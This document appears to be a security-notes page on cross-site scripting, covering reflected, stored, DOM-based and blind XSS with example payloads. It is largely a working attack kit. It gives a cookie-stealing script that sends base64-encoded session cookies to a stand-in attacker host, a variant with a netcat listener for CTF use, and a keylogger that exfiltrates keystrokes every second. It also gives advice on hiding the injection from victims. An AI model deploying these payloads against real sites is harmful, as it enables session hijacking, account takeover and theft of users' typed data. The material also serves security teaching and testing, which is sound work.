# XSS vulnerabilities (JavaScript)

<div class="row row-cols-md-2"><div>

One thing to remember is that you would rather make it invisible to the user that a script is being executed in its browser. As such, if you inject a malicious payload in the source attribute of an image field, it would be best to still make sure an image is properly displayed, so that it does not look suspicious at first glance.

</div><div>

<p class="text-center">Some attacks</p>

**Session hijacking**: anyone executing this script will send their cookie to a malicious website owned by the hacker used to capture cookies. The script is using `btoa()` to encode in base64 the values. Sessions cookies are gold üí∞, because with them, we can simulate that we are logged, and bypass verifications such as 2FA.

```html
<script>fetch('https://hacker.website/hijack?cookie=' + btoa(document.cookie));</script>
<!--
CTF: nc -nlvp port | And use the IP:port
Decode: sed -n 's/GET \/?cookie=\(.*\)/\1/p' request | base64 -d
-->
<script>fetch('http://IP:port/?cookie=' + btoa(document.cookie));</script>
```

**A keylogger**: sends keys pressed to the hacker website. The script is using `btoa()` to encode in base64 the values.

<details class="details-n">
<summary>See code</summary>

```html
<script>
    let keys = ''
    document.onkeydown = e => keys += e.key
    setInterval(() => {
        if (keys === '') return
        fetch('https://hacker.website/keylogger?key=' + btoa(keys) )
        keys = ''
    }, 1000)
</script>
```
</details>

* Exploit the client privileges to query the website API if any
* Map open ports on the target
* ...

> See [XSS-payloads](http://www.xss-payloads.com/payloads-list.html?a#category=all) for more exploits, but it's a bit old.
</div></div>

<hr class="sep-both">

## Reflected XSS

<div class="row row-cols-md-2"><div>

The malicious code is usually inside a URL, and the vulnerable website when loading the URL, will execute the malicious website.
</div><div>

For instance, "https://vulnerable.search.engine" is a search engine in which the query is stored in the URL in the parameter `q`. The website is vulnerable to XSS, so if we open the URL, then the JavaScript will run in our browser.

```
https://vulnerable.search.engine/?q=%3Cscript%3Ealert(%27XSS%27)%3B%3C%2Fscript%3E
```
</div></div>

<hr class="sep-both">

## Stored XSS

<div class="row row-cols-md-2"><div>

The malicious code is stored by the website, usually in a database. Then, on another page loading the data from the database, a vulnerable website will execute the malicious code.

> Comments, profiles, listings... may be vulnerable.
</div><div>

For instance, a user using the value `<script>alert('XSS');</script>` as username. Then, for instance, on a vulnerable profile page, any user opening a link to the compromised profile, will execute the malicious code.
</div></div>

<hr class="sep-both">

## DOM-Based XSS

<div class="row row-cols-md-2"><div>

DOM-Based XSS means using the document events such as when a tag is loaded, when an image is hovered, and so on, to execute JavaScript. It should be viewed as something used by both Reflected and Stored XSS when we can't use the TAG `<script>`.
</div><div>

```html
<img src="https://duckduckgo.com/assets/logo_homepage.alt.v108.svg"
     onload="alert('XSS#load')"
     onerror="alert('XSS#error')"
     onmouseover="alert('XSS#hover')"
/>
```
</div></div>

<hr class="sep-both">

## Blind XSS

<div class="row row-cols-md-2"><div>

In blind <small>(or out-band)</small> XSS, you are usually sending a payload in a contact/support... forms, in order to maybe steal information from the admin-side website if any. We are calling it "blind XSS", because it's not possible to see if it's working.
</div><div>

See [xsshunter](https://github.com/mandatoryprogrammer/xsshunter) (1.2k ‚≠ê)
</div></div>